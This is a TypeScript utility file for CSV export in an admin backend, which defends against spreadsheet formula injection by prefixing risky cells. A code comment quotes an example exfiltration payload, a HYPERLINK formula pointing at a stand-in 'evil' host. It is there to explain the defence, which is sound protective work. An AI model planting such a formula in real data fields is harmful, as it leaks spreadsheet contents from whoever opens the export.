// Minimal CSV helpers — used by admin export endpoints (inventory now,
// orders / products / customers next). Strings are quoted only when they
// need to be (containing commas, quotes, newlines), and the file starts
// with a UTF-8 BOM so Excel opens accented names correctly.

const BOM = '﻿';

// Cells starting with one of these characters are evaluated as formulas by
// Excel, LibreOffice, and Numbers — so a customer whose name field is
// `=HYPERLINK("https://evil/" & A1, "Free $100")` exfiltrates row data the
// moment an admin clicks the cell. Defang by force-quoting and prefixing
// with a single quote inside the quoted cell; the leading `'` is the
// conventional escape that the spreadsheet apps honor without rendering.
// We also strip leading SPACES before the check (a ` =Hello` payload would
// otherwise slip past) but preserve tabs since `\t` is itself one of the
// formula chars and trimming it would defeat the check.
const FORMULA_CHARS = /^[=+\-@\t\r]/;

function escapeCell(value: unknown): string {
  if (value === null || value === undefined) return '';
  const s = typeof value === 'string' ? value : String(value);
  if (FORMULA_CHARS.test(s.replace(/^ +/, ''))) {
    return `"'${s.replace(/"/g, '""')}"`;
  }
  if (/[",\n\r]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

type Column<T> = {
  header: string;
  value: (row: T) => unknown;
};

export function toCsv<T>(rows: T[], columns: Column<T>[]): string {
  const lines: string[] = [];
  lines.push(columns.map((c) => escapeCell(c.header)).join(','));
  for (const row of rows) {
    lines.push(columns.map((c) => escapeCell(c.value(row))).join(','));
  }
  return BOM + lines.join('\r\n');
}

export function csvFilename(prefix: string, date = new Date()): string {
  const yyyy = date.getFullYear();
  const mm = String(date.getMonth() + 1).padStart(2, '0');
  const dd = String(date.getDate()).padStart(2, '0');
  return `${prefix}-${yyyy}-${mm}-${dd}.csv`;
}
